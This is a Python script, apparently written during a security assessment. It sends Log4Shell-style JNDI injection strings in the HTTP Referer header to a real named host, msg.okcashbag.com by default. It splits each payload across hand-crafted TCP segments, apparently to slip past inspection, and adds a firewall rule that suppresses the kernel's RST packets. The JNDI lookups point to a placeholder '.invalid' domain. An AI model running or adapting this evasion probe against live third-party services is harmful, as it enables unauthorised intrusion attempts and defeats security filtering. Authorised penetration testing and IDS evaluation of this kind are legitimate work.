#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import os
import random
import re
import socket
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass
from pathlib import Path

from scapy.all import IP, Raw, TCP, conf, rdpcap, send, sr1  # type: ignore


TIMEOUT = 10
POST_WAIT = 5.0
SEGMENT_DELAY = 0.35


@dataclass
class Case:
    name: str
    referer: str
    split_mode: str
    note: str


CASES = [
    Case(
        name="baseline_benign",
        referer="https://example.com/ocb/tc08-control",
        split_mode="mid_referer",
        note="control request with valid app headers and benign referer",
    ),
    Case(
        name="plain_jndi",
        referer="${jndi:ldap://segprobe.invalid/tc08-plain}",
        split_mode="dollar_brace",
        note="plain JNDI marker split between $ and {",
    ),
    Case(
        name="unicode_jndi",
        referer="\\u0024\\u007bjndi:ldap://segprobe.invalid/tc08-unicode}",
        split_mode="unicode_gap",
        note="unicode escaped JNDI marker split between \\u0024 and \\u007b",
    ),
]


class PfGuard:
    def __init__(self, iface: str, dst: str, sport: int, dport: int) -> None:
        self.iface = iface
        self.dst = dst
        self.sport = sport
        self.dport = dport
        self.anchor = f"codex.tc08.{os.getpid()}.{sport}"
        self.enabled_token: str | None = None
        self.rule_file: str | None = None
        self.active = False

    def __enter__(self) -> "PfGuard":
        if sys.platform != "darwin":
            return self
        info = subprocess.check_output(["pfctl", "-s", "info"], text=True, stderr=subprocess.STDOUT)
        if "Disabled" in info:
            output = subprocess.check_output(["pfctl", "-E"], text=True, stderr=subprocess.STDOUT)
            match = re.search(r"Token\\s*:\\s*(\\d+)", output)
            if match:
                self.enabled_token = match.group(1)
        rule = (
            f"block drop out quick on {self.iface} proto tcp "
            f"from any port {self.sport} to {self.dst} port {self.dport} flags R/R\n"
        )
        with tempfile.NamedTemporaryFile("w", delete=False, encoding="utf-8") as handle:
            handle.write(rule)
            self.rule_file = handle.name
        subprocess.check_output(
            ["pfctl", "-a", self.anchor, "-f", self.rule_file],
            text=True,
            stderr=subprocess.STDOUT,
        )
        self.active = True
        return self

    def __exit__(self, exc_type, exc, tb) -> None:
        if sys.platform == "darwin" and self.active:
            subprocess.run(["pfctl", "-a", self.anchor, "-F", "all"], check=False, capture_output=True)
        if self.enabled_token:
            subprocess.run(["pfctl", "-X", self.enabled_token], check=False, capture_output=True)
        if self.rule_file:
            Path(self.rule_file).unlink(missing_ok=True)


class TcpdumpCapture:
    def __init__(self, dst: str, sport: int, pcap_path: Path) -> None:
        self.dst = dst
        self.sport = sport
        self.pcap_path = pcap_path
        self.proc: subprocess.Popen[str] | None = None

    def __enter__(self) -> "TcpdumpCapture":
        self.proc = subprocess.Popen(
            [
                "sudo",
                "tcpdump",
                "-ni",
                "any",
                "host",
                self.dst,
                "and",
                "tcp",
                "and",
                "port",
                str(self.sport),
                "-w",
                str(self.pcap_path),
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            text=True,
        )
        time.sleep(1.0)
        return self

    def __exit__(self, exc_type, exc, tb) -> None:
        if self.proc is None:
            return
        self.proc.terminate()
        try:
            self.proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            self.proc.kill()
            self.proc.wait(timeout=3)


def detect_iface(dst: str) -> str:
    route = subprocess.check_output(["route", "-n", "get", dst], text=True)
    for line in route.splitlines():
        if line.strip().startswith("interface:"):
            return line.split(":", 1)[1].strip()
    return conf.iface  # type: ignore[return-value]


def write_text(path: Path, text: str) -> None:
    path.write_text(text, encoding="utf-8")


def dump_json(path: Path, payload: dict) -> None:
    path.write_text(json.dumps(payload, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")


def build_request(host: str, headers: list[tuple[str, str]]) -> str:
    lines = [
        "GET /sugar/app/extra_meta HTTP/1.1",
        f"Host: {host}",
        "User-Agent: OCB-TC08-CONTRACT",
    ]
    for key, value in headers:
        lines.append(f"{key}: {value}")
    lines.append("Connection: close")
    return "\r\n".join(lines) + "\r\n\r\n"


def split_chunks(raw: bytes, mode: str) -> list[bytes]:
    if mode == "dollar_brace":
        token = b"${"
        idx = raw.index(token) + 1
        return [raw[:idx], raw[idx:]]
    if mode == "unicode_gap":
        token = b"\\u0024\\u007b"
        idx = raw.index(token) + len(b"\\u0024")
        return [raw[:idx], raw[idx:]]
    if mode == "mid_referer":
        token = b"Referer: "
        start = raw.index(token) + len(token)
        idx = start + 16
        return [raw[:idx], raw[idx:]]
    raise ValueError(f"unknown split mode: {mode}")


def curl_baseline(url: str, headers: list[tuple[str, str]], out_dir: Path, name: str) -> dict:
    body = out_dir / f"{name}_baseline.body"
    hdr = out_dir / f"{name}_baseline.hdr"
    cmd = ["curl", "-m", str(TIMEOUT), "-sS", "-o", str(body), "-D", str(hdr), "-w", "%{http_code}", url]
    for key, value in headers:
        cmd.extend(["-H", f"{key}: {value}"])
    cmd.extend(["-H", "Connection: close"])
    proc = subprocess.run(cmd, text=True, capture_output=True)
    return {
        "http_code": proc.stdout.strip() or "000",
        "curl_rc": proc.returncode,
        "stderr": proc.stderr.strip(),
        "hdr_path": str(hdr),
        "body_path": str(body),
    }


def raw_probe(
    host: str,
    dst: str,
    iface: str,
    dport: int,
    headers: list[tuple[str, str]],
    split_mode: str,
    out_dir: Path,
    name: str,
) -> dict:
    sport = random.randint(43000, 49000)
    request_text = build_request(host, headers)
    request_bytes = request_text.encode("utf-8")
    chunks = split_chunks(request_bytes, split_mode)
    write_text(out_dir / f"{name}_segmented_request.txt", request_text)
    pcap_path = out_dir / f"{name}.pcap"

    seq = random.randint(100000, 900000)
    syn = IP(dst=dst) / TCP(sport=sport, dport=dport, flags="S", seq=seq)

    with TcpdumpCapture(dst=dst, sport=sport, pcap_path=pcap_path), PfGuard(iface=iface, dst=dst, sport=sport, dport=dport):
        synack = sr1(syn, timeout=TIMEOUT, verbose=0)
        if synack is None:
            time.sleep(0.5)
            packets = rdpcap(str(pcap_path)) if pcap_path.exists() and pcap_path.stat().st_size else []
            return {
                "sport": sport,
                "iface": iface,
                "chunk_lengths": [len(chunk) for chunk in chunks],
                "packet_count": len(packets),
                "synack_flags": None,
                "response_preview": "",
                "error": "no_synack",
            }

        ack_seq = synack.ack
        peer_seq = synack.seq + 1
        send(IP(dst=dst) / TCP(sport=sport, dport=dport, flags="A", seq=ack_seq, ack=peer_seq), verbose=0)

        current_seq = ack_seq
        for chunk in chunks:
            packet = IP(dst=dst) / TCP(sport=sport, dport=dport, flags="PA", seq=current_seq, ack=peer_seq) / Raw(load=chunk)
            send(packet, verbose=0)
            current_seq += len(chunk)
            time.sleep(SEGMENT_DELAY)

        time.sleep(POST_WAIT)

    packets = rdpcap(str(pcap_path)) if pcap_path.exists() and pcap_path.stat().st_size else []

    response_payloads: list[bytes] = []
    for packet in packets:
        if IP in packet and TCP in packet and packet[IP].src == dst and packet[TCP].dport == sport and Raw in packet:
            response_payloads.append(bytes(packet[Raw].load))
    response_preview = b"".join(response_payloads)[:240].decode("latin-1", errors="replace")
    return {
        "sport": sport,
        "iface": iface,
        "chunk_lengths": [len(chunk) for chunk in chunks],
        "packet_count": len(packets),
        "synack_flags": synack.sprintf("%TCP.flags%"),
        "response_preview": response_preview,
        "pcap_path": str(out_dir / f"{name}.pcap"),
    }


def main() -> int:
    parser = argparse.ArgumentParser(description="Run strengthened TC-08 contract-aware probes")
    parser.add_argument("--output-dir", required=True)
    parser.add_argument("--host", default="msg.okcashbag.com")
    parser.add_argument("--port", type=int, default=80)
    args = parser.parse_args()

    out_dir = Path(args.output_dir).resolve()
    out_dir.mkdir(parents=True, exist_ok=True)
    dst = socket.gethostbyname(args.host)
    iface = detect_iface(dst)

    shared_headers = [
        ("x-ocb-agent", "ocb_7.1.2,android_15; accept=json; crypted=0"),
        ("x-ocb-crypted-sid", "w3JSPv/UyGt4cLmi"),
    ]
    url = f"http://{args.host}/sugar/app/extra_meta"

    results = {
        "host": args.host,
        "dst": dst,
        "iface": iface,
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "cases": [],
    }

    for case in CASES:
        case_headers = shared_headers + [("Referer", case.referer)]
        baseline = curl_baseline(url, case_headers, out_dir, case.name)
        segmented = raw_probe(
            host=args.host,
            dst=dst,
            iface=iface,
            dport=args.port,
            headers=case_headers,
            split_mode=case.split_mode,
            out_dir=out_dir,
            name=case.name,
        )
        payload = {
            "name": case.name,
            "note": case.note,
            "baseline": baseline,
            "segmented": segmented,
        }
        dump_json(out_dir / f"{case.name}_result.json", payload)
        results["cases"].append(payload)

    dump_json(out_dir / "summary.json", results)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
